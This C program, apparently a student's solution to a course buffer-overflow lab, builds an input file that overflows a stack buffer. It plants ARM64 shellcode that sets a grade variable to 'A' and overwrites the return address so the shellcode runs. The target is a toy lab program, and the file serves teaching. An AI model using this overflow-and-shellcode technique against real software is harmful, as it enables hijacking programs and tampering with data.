/* produces a file called dataA with the student name, a null byte,
   padding to overrun the stack, and shellcode that sets grade='A'
   followed by a branch back to main. the return address is 
   overwritten to point to the shellcode in the name array. */

#include <stdio.h>
#include <stdint.h>
#include "miniassembler.h"

/* writes binary data to dataA file to exploit buffer overflow.
   takes no command line arguments, reads nothing from stdin,
   writes attack data to dataA file, writes nothing to stdout,
   returns 0 on success. */
int main(void) {
    FILE *fp;
    int i;
    uint64_t shellcode_addr;
    unsigned int instr1, instr2, instr3, instr4;
    unsigned char *bytes;
    
    fp = fopen("dataA", "wb");
    
    /* write student name (5 bytes) */
    fwrite("Kevin", 1, 5, fp);
    
    /* write null terminator */
    fputc('\0', fp);
    
    /* write 2 alignment bytes so shellcode lands at 0x420060
     (4-byte aligned) */
    fputc('\0', fp);
    fputc('\0', fp);
    
    /* generate shellcode using miniassembler functions */
    /* shellcode starts at name[8] = 0x420060 */
    
    /* instruction 1: adr x0, 0x420044 (load grade address) at 
    0x420060 */
    instr1 = MiniAssembler_adr(0, 0x420044, 0x420060);
    
    /* instruction 2: mov w1, #0x41 (load 'A') at 0x420064 */
    instr2 = MiniAssembler_mov(1, 0x41);
    
    /* instruction 3: strb w1, [x0] (store 'A' at grade) at 0x420068*/
    instr3 = MiniAssembler_strb(1, 0);
    
    /* instruction 4: b 0x40089c (branch back to main+64) at 
    0x42006c */
    instr4 = MiniAssembler_b(0x40089c, 0x42006c);
    
    /* write shellcode bytes (4 instructions, 16 bytes total) */
    bytes = (unsigned char *)&instr1;
    for (i = 0; i < 4; i++) {
        fputc(bytes[i], fp);
    }
    
    bytes = (unsigned char *)&instr2;
    for (i = 0; i < 4; i++) {
        fputc(bytes[i], fp);
    }
    
    bytes = (unsigned char *)&instr3;
    for (i = 0; i < 4; i++) {
        fputc(bytes[i], fp);
    }
    
    bytes = (unsigned char *)&instr4;
    for (i = 0; i < 4; i++) {
        fputc(bytes[i], fp);
    }
    
    /* padding to fill remaining buf space (48 - 8 - 16 = 24 bytes) */
    for (i = 0; i < 24; i++) {
        fputc('A', fp);
    }
    
    /*tar get address 0x420060 (start of shellcode) in little-endian*/
    shellcode_addr = 0x420060;
    fwrite(&shellcode_addr, sizeof(shellcode_addr), 1, fp);
    
    /* write final newline to terminate input properly */
    fputc('\n', fp);
    
    fclose(fp);
    return 0;
}